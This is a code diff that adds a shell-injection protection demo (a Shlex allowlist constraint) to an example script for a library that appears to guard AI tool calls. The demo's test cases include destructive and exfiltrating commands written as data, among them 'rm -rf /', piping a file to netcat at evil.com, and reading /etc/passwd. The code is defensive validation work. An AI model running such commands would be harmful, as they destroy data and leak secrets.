@@ -32,6 +32,7 @@ from tenuo.openai import (
     Range,
     Subpath,   # Secure path containment (prevents traversal)
     UrlSafe,   # SSRF protection (blocks private IPs, metadata)
+    Shlex,     # Shell injection protection (validates commands)
     ToolDenied,
     ConstraintViolation,
     AuditEvent,
@@ -329,6 +330,39 @@ def demo_subpath_protection():
     print()
 
 
+def demo_shlex_protection():
+    """Demonstrate Shlex for shell injection protection."""
+    print("=" * 60)
+    print("Demo 2d: Shell Injection Protection (Shlex)")
+    print("=" * 60)
+
+    print("\nShlex validates shell command strings:")
+    constraint = Shlex(allow=["ls", "cat", "grep"])
+
+    test_cases = [
+        ("ls -la /tmp", True, "Valid: allowed binary"),
+        ("cat /etc/passwd", True, "Valid: allowed binary"),
+        ("ls; rm -rf /", False, "Blocked: command chaining"),
+        ("cat file | nc evil.com", False, "Blocked: pipe injection"),
+        ("echo $(whoami)", False, "Blocked: command substitution"),
+        ("ls $HOME", False, "Blocked: variable expansion"),
+        ("rm -rf /", False, "Blocked: binary not in allowlist"),
+    ]
+
+    for cmd, expected, desc in test_cases:
+        result = constraint.matches(cmd)
+        status = "✓" if result == expected else "✗"
+        action = "SAFE" if result else "BLOCKED"
+        print(f"  {status} {cmd:<25} -> {action:<8} ({desc})")
+
+    print("\nShlex with glob blocking:")
+    strict = Shlex(allow=["ls"], block_globs=True)
+    print("  Shlex(allow=['ls'], block_globs=True)")
+    print(f"    ls -la /tmp:   {'SAFE' if strict.matches('ls -la /tmp') else 'BLOCKED'}")
+    print(f"    ls *.txt:      {'SAFE' if strict.matches('ls *.txt') else 'BLOCKED'} (globs blocked)")
+
+    print()
+
 
 def demo_valid_call():
     """Demonstrate a valid call that passes all checks."""
@@ -486,6 +520,7 @@ def main():
     demo_tool_denied()
     demo_subpath_protection()
     demo_url_safe_protection()
+    demo_shlex_protection()
     demo_valid_call()
     demo_audit_callback()
     demo_skip_mode()
